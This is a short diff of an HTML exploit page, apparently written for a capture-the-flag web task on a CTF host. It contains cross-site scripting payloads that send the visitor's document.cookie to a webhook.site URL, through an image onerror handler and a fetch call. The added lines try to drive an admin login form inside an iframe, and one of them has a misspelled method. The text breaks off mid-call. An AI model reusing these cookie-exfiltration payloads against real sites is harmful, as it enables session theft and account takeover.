@@ -2,14 +2,18 @@
 <html>
                 <body>
 
-                    <iframe  name="frame"></iframe>
+                    <iframe  name="frame" src="https://tasks.goidactf.ru:20055/admin"></iframe>
 
                     <a href="https://webhook.site/81a20f93-8670-419e-a8b4-e61bba21b005?q=" target="frame" id="link">Go to admin login</a>
                     <img src=x onerror="fetch('https://webhook.site/81a20f93-8670-419e-a8b4-e61bba21b005?q='+document.cookie)" alt="">
          
 <script>
-    document.getElementById('link').href="https://webhook.site/81a20f93-8670-419e-a8b4-e61bba21b005?q="+document.cookie;
-    document.getElementById('link').click();
+   const iframe = document.getElementsByName('frame')[0];
+const doc = iframe.contentWindow.document;
+const input = doc.getElementById("LoginInput");
+input.value = "test";
+
+doc.getElementByTagName("button")[0].click();
 fetch('https://webhook.site/81a20f93-8670-419e-a8b4-e61bba21b005?q='+document.cookie,
 {
     method:'GET',
